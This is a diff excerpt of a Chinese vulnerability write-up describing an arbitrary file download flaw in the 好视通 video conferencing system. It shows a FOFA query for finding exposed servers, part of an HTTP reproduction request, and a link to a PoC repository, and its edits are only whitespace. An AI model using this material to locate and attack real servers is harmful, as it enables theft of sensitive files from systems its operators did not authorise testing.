@@ -20,11 +20,11 @@ source: "MrWQ/vulnerability-paper"
 
 **银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息**
 
-**二:  漏洞影响🐇**
+**二:  漏洞影响🐇**
 
 **银澎云计算 好视通视频会议系统**
 
-**三:  漏洞复现🐋**
+**三:  漏洞复现🐋**
 
 ```
 FOFA: app="Hanming-Video-Conferencing"
@@ -49,19 +49,19 @@ Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
-Cookie: mldn-session-id=7950aca4-6faa-46d9-858a-97b82d619741
+Cookie: mldn-session-id=7950aca4-6faa-46d9-858a-97b82d619741
 Connection: close
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3QUjjWLYt3PO1JXGtbwlLww4HgkoA907OevIULD76z8IWurXb4VpiaUw/640?wx_fmt=png)
 
- ****四:  Goby & POC🦉****
+ ****四:  Goby & POC🦉****
 
 ```
-Goby & POC 已经上传到 github 的 Goby & POC 目录
+Goby & POC 已经上传到 github 的 Goby & POC 目录
 https://github.com/PeiQi0/PeiQi-WIKI-POC
 ```
 
@@ -69,7 +69,7 @@ https://github.com/PeiQi0/PeiQi-WIKI-POC
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG368fHF3y8RSyqz9F8S30UnKUVs54HVFiayMaRZjkYqPHzmicKaZIciabmw/640?wx_fmt=png)
 
- ****五:  关于文库🦉****
+ ****五:  关于文库🦉****
 
 **在线文库：**
 
